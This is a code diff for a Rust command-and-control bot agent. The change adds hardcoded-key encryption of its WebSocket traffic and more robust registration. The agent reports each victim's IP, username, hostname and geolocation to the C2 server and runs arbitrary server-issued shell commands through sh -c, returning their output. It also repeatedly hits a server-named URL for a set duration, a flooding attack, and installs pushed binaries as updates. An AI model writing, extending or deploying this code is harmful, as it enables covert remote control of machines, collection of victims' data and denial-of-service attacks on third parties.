@@ -1,6 +1,5 @@
 use std::time::Duration;
-
-use crate::handlers::models::{Agent as C2Agent, C2Message, Location};
+use crate::handlers::models::{C2Message, Location};
 use futures::prelude::*;
 use hostname::get as hostname;
 use reqwest::Client;
@@ -11,14 +10,22 @@ use tokio::time::timeout;
 use tokio_tungstenite::tungstenite::Message;
 use tokio_tungstenite::{MaybeTlsStream, WebSocketStream};
 use uuid::Uuid;
+use chacha20poly1305::{
+    aead::{Aead, AeadCore, KeyInit, OsRng},
+    XChaCha20Poly1305, XNonce,
+};
+use base64;
 
 pub struct Agent {
     uuid: String,
     ws: WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
     client: Client,
+    agent_key: [u8; 32],
 }
 
-const AGENT_VERSION: &str = "1.0.1"; // Versão atual do agente
+const AGENT_VERSION: &str = "1.0.1"; // Current agent version
+// Hardcoded key (Base64-encoded, decodes to 32 bytes)
+const AGENT_PRIVATE_KEY_B64: &str = "k3V9a2J4cXV4cXV5end1dHNlY3VyZWRrZXkxMjM0NTY=";
 
 fn is_agent_up_to_date(version: &str) -> bool {
     version == AGENT_VERSION
@@ -26,6 +33,10 @@ fn is_agent_up_to_date(version: &str) -> bool {
 
 impl Agent {
     pub async fn new() -> Result<Self, Box<dyn std::error::Error>> {
+        // Decode hardcoded key
+        let agent_key = base64::decode(AGENT_PRIVATE_KEY_B64).map_err(|e| format!("Failed to decode hardcoded AGENT_PRIVATE_KEY: {}", e))?;
+        let agent_key: [u8; 32] = agent_key.try_into().map_err(|_| "Hardcoded key has invalid length (must be 32 bytes)")?;
+
         let mut uuid = String::new();
         let config_dir = match dirs::home_dir() {
             Some(path) => path.join(".unique_id"),
@@ -48,15 +59,15 @@ impl Agent {
             eprintln!("Loaded UUID from file: {}", uuid);
         }
 
-        let client = Client::builder().timeout(Duration::from_secs(10)).build()?;
+        let client = Client::builder().timeout(Duration::from_secs(15)).build()?;
         let (ws, _) = tokio_tungstenite::connect_async("ws://localhost:80/c2").await?;
 
-        Ok(Agent { uuid, ws, client })
+        Ok(Agent { uuid, ws, client, agent_key })
     }
 
     pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
         loop {
-            // Enviar VersionCheck ao conectar
+            // Send VersionCheck on connection
             let version_check_msg = serde_json::to_string(&C2Message::VersionCheck {
                 uuid: self.uuid.clone(),
                 agent_version: AGENT_VERSION.to_string(),
@@ -65,9 +76,10 @@ impl Agent {
                 "Agent {} sending VersionCheck: {}",
                 self.uuid, version_check_msg
             );
-            self.ws.send(Message::text(version_check_msg)).await?;
+            let encrypted = self.encrypt_message(&version_check_msg).await?;
+            self.ws.send(Message::binary(encrypted)).await?;
 
-            // Aguardar VersionResponse ou UpdateSoftwareWithBinary
+            // Wait for VersionResponse or UpdateSoftwareWithBinary
             let mut version_checked = false;
             let mut attempts = 0;
             const MAX_ATTEMPTS: u32 = 3;
@@ -81,49 +93,68 @@ impl Agent {
                 match timeout(Duration::from_secs(30), self.ws.next()).await {
                     Ok(Some(Ok(msg))) => {
                         eprintln!("Agent {}: received message from server", self.uuid);
-                        if let Ok(text) = msg.into_text() {
-                            eprintln!("Agent {}: received text: {}", self.uuid, text);
-                            if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
-                                match c2_msg {
-                                    C2Message::VersionResponse { version } => {
-                                        eprintln!(
-                                            "Agent {} received VersionResponse: version={}",
-                                            self.uuid, version
-                                        );
-                                        if !is_agent_up_to_date(&version) {
-                                            eprintln!("Version mismatch, waiting for update...");
-                                            continue;
-                                        }
-                                        version_checked = true;
-                                        let ack_msg =
-                                            serde_json::to_string(&C2Message::VersionCheckAck {})?;
-                                        eprintln!(
-                                            "Agent {} sending VersionCheckAck: {}",
-                                            self.uuid, ack_msg
-                                        );
-                                        self.ws.send(Message::text(ack_msg)).await?;
-                                        break;
-                                    }
-                                    C2Message::UpdateSoftwareWithBinary { version, binary } => {
-                                        eprintln!("Received update for version {}", version);
-                                        self.update_software(&version, binary).await?;
-                                        return Err("Agent updated and restarting".into());
-                                    }
-                                    _ => {
-                                        eprintln!(
-                                            "Received unexpected message during version check: {:?}",
-                                            c2_msg
-                                        );
-                                    }
+                        let text = if msg.is_binary() {
+                            let data = msg.into_data();
+                            if data.len() < 24 {
+                                eprintln!("Agent {}: invalid message length", self.uuid);
+                                continue;
+                            }
+                            let nonce = XNonce::from_slice(&data[..24]);
+                            let ciphertext = &data[24..];
+                            let cipher = XChaCha20Poly1305::new(&self.agent_key.into());
+                            match cipher.decrypt(nonce, ciphertext) {
+                                Ok(plaintext) => String::from_utf8(plaintext).unwrap_or_default(),
+                                Err(e) => {
+                                    eprintln!("Agent {}: decryption error: {}", self.uuid, e);
+                                    continue;
                                 }
-                            } else {
-                                eprintln!(
-                                    "Agent {} failed to deserialize message: {}",
-                                    self.uuid, text
-                                );
+                            }
+                        } else if let Ok(text) = msg.into_text() {
+                            text
+                        } else {
+                            eprintln!("Agent {}: received non-text/binary message", self.uuid);
+                            continue;
+                        };
+
+                        eprintln!("Agent {}: received text: {}", self.uuid, text);
+                        if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
+                            match c2_msg {
+                                C2Message::VersionResponse { version } => {
+                                    eprintln!(
+                                        "Agent {} received VersionResponse: version={}",
+                                        self.uuid, version
+                                    );
+                                    if !is_agent_up_to_date(&version) {
+                                        eprintln!("Version mismatch, waiting for update...");
+                                        continue;
+                                    }
+                                    version_checked = true;
+                                    let ack_msg = serde_json::to_string(&C2Message::VersionCheckAck {})?;
+                                    eprintln!(
+                                        "Agent {} sending VersionCheckAck: {}",
+                                        self.uuid, ack_msg
+                                    );
+                                    let encrypted = self.encrypt_message(&ack_msg).await?;
+                                    self.ws.send(Message::binary(encrypted)).await?;
+                                    break;
+                                }
+                                C2Message::UpdateSoftwareWithBinary { version, binary } => {
+                                    eprintln!("Received update for version {}", version);
+                                    self.update_software(&version, binary).await?;
+                                    return Err("Agent updated and restarting".into());
+                                }
+                                _ => {
+                                    eprintln!(
+                                        "Received unexpected message during version check: {:?}",
+                                        c2_msg
+                                    );
+                                }
                             }
                         } else {
-                            eprintln!("Agent {} received non-text message", self.uuid);
+                            eprintln!(
+                                "Agent {} failed to deserialize message: {}",
+                                self.uuid, text
+                            );
                         }
                     }
                     Ok(Some(Err(e))) => {
@@ -155,44 +186,69 @@ impl Agent {
                 continue;
             }
 
-            // Enviar registro após verificar a versão
-            let ip = self
-                .client
-                .get("https://api.ipify.org/")
-                .send()
-                .await?
-                .text()
-                .await?;
+            // Send registration after version check with updated IP
+            let ip = match self.client.get("https://api.ipify.org/").send().await {
+                Ok(resp) => match resp.text().await {
+                    Ok(ip) => {
+                        eprintln!("Agent {} fetched IP: {}", self.uuid, ip);
+                        ip
+                    }
+                    Err(e) => {
+                        eprintln!("Agent {} failed to parse IP response: {}", self.uuid, e);
+                        "Unknown".to_string()
+                    }
+                },
+                Err(e) => {
+                    eprintln!("Agent {} failed to fetch IP: {}", self.uuid, e);
+                    "Unknown".to_string()
+                }
+            };
 
             let username = whoami::username();
-
             let hostname = hostname()?.to_string_lossy().to_string();
 
-            let location_response = self
-                .client
-                .get(format!("https://freeipapi.com/api/json/{}", ip))
-                .send()
-                .await?
-                .text()
-                .await?;
-
-            let location_json: Value = serde_json::from_str(&location_response)?;
-            let location = Location {
-                country: location_json["countryName"]
-                    .as_str()
-                    .unwrap_or("Unknown")
-                    .to_string(),
-                city: location_json["cityName"]
-                    .as_str()
-                    .unwrap_or("Unknown")
-                    .to_string(),
-                region: location_json["regionName"]
-                    .as_str()
-                    .unwrap_or("Unknown")
-                    .to_string(),
-                latitude: location_json["latitude"].as_f64().unwrap_or(0.0),
-                longitude: location_json["longitude"].as_f64().unwrap_or(0.0),
+            // Attempt to fetch location with retries
+            let mut location = Location {
+                country: "Unknown".to_string(),
+                city: "Unknown".to_string(),
+                region: "Unknown".to_string(),
+                latitude: 0.0,
+                longitude: 0.0,
             };
+            let max_retries = 2;
+            for attempt in 1..=max_retries {
+                let url = format!("https://freeipapi.com/api/json/{}", ip);
+                match self.client.get(&url).send().await {
+                    Ok(resp) => match resp.text().await {
+                        Ok(text) => {
+                            if let Ok(json) = serde_json::from_str::<Value>(&text) {
+                                location = Location {
+                                    country: json["countryName"].as_str().unwrap_or("Unknown").to_string(),
+                                    city: json["cityName"].as_str().unwrap_or("Unknown").to_string(),
+                                    region: json["regionName"].as_str().unwrap_or("Unknown").to_string(),
+                                    latitude: json["latitude"].as_f64().unwrap_or(0.0),
+                                    longitude: json["longitude"].as_f64().unwrap_or(0.0),
+                                };
+                                eprintln!("Agent {} fetched location: {:?}", self.uuid, location);
+                                break;
+                            } else {
+                                eprintln!("Agent {} failed to parse location JSON (attempt {}/{}): {}", self.uuid, attempt, max_retries, text);
+                            }
+                        }
+                        Err(e) => {
+                            eprintln!("Agent {} failed to read location response (attempt {}/{}): {}", self.uuid, attempt, max_retries, e);
+                        }
+                    },
+                    Err(e) => {
+                        eprintln!("Agent {} failed to fetch location from {} (attempt {}/{}): {}", self.uuid, url, attempt, max_retries, e);
+                        if attempt == max_retries {
+                            eprintln!("Agent {} using default location after {} failed attempts", self.uuid, max_retries);
+                        } else {
+                            tokio::time::sleep(Duration::from_secs(1)).await;
+                        }
+                    }
+                }
+            }
 
             let register_msg = serde_json::to_string(&C2Message::AgentRegister {
                 uuid: self.uuid.clone(),
@@ -210,95 +266,98 @@ impl Agent {
                 "Agent {} sending register message: {}",
                 self.uuid, register_msg
             );
-            self.ws.send(Message::text(register_msg)).await?;
+            let encrypted = self.encrypt_message(&register_msg).await?;
+            self.ws.send(Message::binary(encrypted)).await?;
 
-            // Processar mensagens do servidor
+            // Process server messages
             while let Some(msg) = self.ws.next().await {
                 match msg {
                     Ok(msg) => {
-                        if let Ok(text) = msg.into_text() {
-                            if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
-                                match c2_msg {
-                                    C2Message::Ping => {
-                                        self.ws
-                                            .send(Message::text(serde_json::to_string(
-                                                &C2Message::Pong,
-                                            )?))
-                                            .await?;
-                                    }
-                                    C2Message::Command { uuid, cmd } => {
-                                        if uuid == self.uuid {
-                                            if let Ok(json) = serde_json::from_str::<Value>(&cmd) {
-                                                if json["action"] == "access" {
-                                                    let url = json["url"].as_str().unwrap_or("");
-                                                    let secs =
-                                                        json["duration_secs"].as_u64().unwrap_or(0);
-                                                    let end_time = std::time::Instant::now()
-                                                        + Duration::from_secs(secs);
-                                                    while std::time::Instant::now() < end_time {
-                                                        let _ = self.client.get(url).send().await;
-                                                    }
-                                                } else {
-                                                    Command::new("sh")
-                                                        .arg("-c")
-                                                        .arg(&cmd)
-                                                        .output()
-                                                        .await?;
-                                                }
-                                            }
-                                        }
-                                    }
-                                    C2Message::Broadcast { cmd } => {
+                        let text = if msg.is_binary() {
+                            let data = msg.into_data();
+                            if data.len() < 24 {
+                                eprintln!("Agent {}: invalid message length", self.uuid);
+                                continue;
+                            }
+                            let nonce = XNonce::from_slice(&data[..24]);
+                            let ciphertext = &data[24..];
+                            let cipher = XChaCha20Poly1305::new(&self.agent_key.into());
+                            match cipher.decrypt(nonce, ciphertext) {
+                                Ok(plaintext) => String::from_utf8(plaintext).unwrap_or_default(),
+                                Err(e) => {
+                                    eprintln!("Agent {}: decryption error: {}", self.uuid, e);
+                                    continue;
+                                }
+                            }
+                        } else if let Ok(text) = msg.into_text() {
+                            text
+                        } else {
+                            eprintln!("Agent {}: received non-text/binary message", self.uuid);
+                            continue;
+                        };
+
+                        if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
+                            match c2_msg {
+                                C2Message::Ping => {
+                                    let pong_msg = serde_json::to_string(&C2Message::Pong)?;
+                                    let encrypted = self.encrypt_message(&pong_msg).await?;
+                                    self.ws.send(Message::binary(encrypted)).await?;
+                                }
+                                C2Message::Command { uuid, cmd } => {
+                                    if uuid == self.uuid {
                                         if let Ok(json) = serde_json::from_str::<Value>(&cmd) {
                                             if json["action"] == "access" {
-                                                let url = json["url"].as_str().unwrap_or_default();
-                                                let secs =
-                                                    json["duration_secs"].as_u64().unwrap_or(0);
+                                                let url = json["url"].as_str().unwrap_or("");
+                                                let secs = json["duration_secs"].as_u64().unwrap_or(0);
                                                 let end_time = std::time::Instant::now()
                                                     + Duration::from_secs(secs);
                                                 while std::time::Instant::now() < end_time {
-                                                    let output = match self.client.get(url).send().await {
-                                                        Ok(resp) => resp.text().await.unwrap_or_else(|e| {
-                                                            format!("Error on receiving response: {}", e)
-                                                        }),
-                                                        Err(e) => {
-                                                            format!("Error on sending request: {}", e)
-                                                        }
-                                                    };
-
-                                                    self.ws
-                                                        .send(Message::text(serde_json::to_string(
-                                                            &C2Message::CommandResponse { output },
-                                                        )?))
-                                                        .await?;
-                                                    tokio::time::sleep(Duration::from_millis(100))
-                                                        .await;
+                                                    let _ = self.client.get(url).send().await;
                                                 }
                                             } else {
-                                                let output: std::process::Output =
-                                                    Command::new("sh")
-                                                        .arg("-c")
-                                                        .arg(&cmd)
-                                                        .output()
-                                                        .await?;
-                                                let output =
-                                                    String::from_utf8_lossy(&output.stdout)
-                                                        .to_string();
-
-                                                self.ws
-                                                    .send(Message::text(serde_json::to_string(
-                                                        &C2Message::CommandResponse { output },
-                                                    )?))
+                                                let output = Command::new("sh")
+                                                    .arg("-c")
+                                                    .arg(&cmd)
+                                                    .output()
                                                     .await?;
+                                                let output_str = String::from_utf8_lossy(&output.stdout).to_string();
+                                                let response_msg = serde_json::to_string(&C2Message::CommandResponse { output: output_str })?;
+                                                let encrypted = self.encrypt_message(&response_msg).await?;
+                                                self.ws.send(Message::binary(encrypted)).await?;
                                             }
                                         }
                                     }
-                                    C2Message::UpdateSoftwareWithBinary { version, binary } => {
-                                        self.update_software(&version, binary).await?;
-                                        return Err("Agent updated and restarting".into());
-                                    }
-                                    _ => {}
                                 }
+                                C2Message::Broadcast { cmd } => {
+                                    if let Ok(json) = serde_json::from_str::<Value>(&cmd) {
+                                        if json["action"] == "access" {
+                                            let url = json["url"].as_str().unwrap_or_default();
+                                            let secs = json["duration_secs"].as_u64().unwrap_or(0);
+                                            let end_time = std::time::Instant::now()
+                                                + Duration::from_secs(secs);
+                                            while std::time::Instant::now() < end_time {
+                                                let _ = self.client.get(url).send().await;
+                                                tokio::time::sleep(Duration::from_millis(100)).await;
+                                            }
+                                        } else {
+                                            let output: std::process::Output = Command::new("sh")
+                                                .arg("-c")
+                                                .arg(&cmd)
+                                                .output()
+                                                .await?;
+                                            let output = String::from_utf8_lossy(&output.stdout).to_string();
+
+                                            let response_msg = serde_json::to_string(&C2Message::CommandResponse { output })?;
+                                            let encrypted = self.encrypt_message(&response_msg).await?;
+                                            self.ws.send(Message::binary(encrypted)).await?;
+                                        }
+                                    }
+                                }
+                                C2Message::UpdateSoftwareWithBinary { version, binary } => {
+                                    self.update_software(&version, binary).await?;
+                                    return Err("Agent updated and restarting".into());
+                                }
+                                _ => {}
                             }
                         }
                     }
@@ -343,5 +402,14 @@ impl Agent {
         Command::new("sh").arg("-c").arg(command).spawn()?;
 
         std::process::exit(0);
+    }
+
+    async fn encrypt_message(&self, message: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+        let cipher = XChaCha20Poly1305::new(&self.agent_key.into());
+        let nonce = XChaCha20Poly1305::generate_nonce(&mut OsRng);
+        let mut ciphertext = cipher.encrypt(&nonce, message.as_bytes()).unwrap();
+        let mut result = nonce.to_vec();
+        result.append(&mut ciphertext);
+        Ok(result)
     }
 }
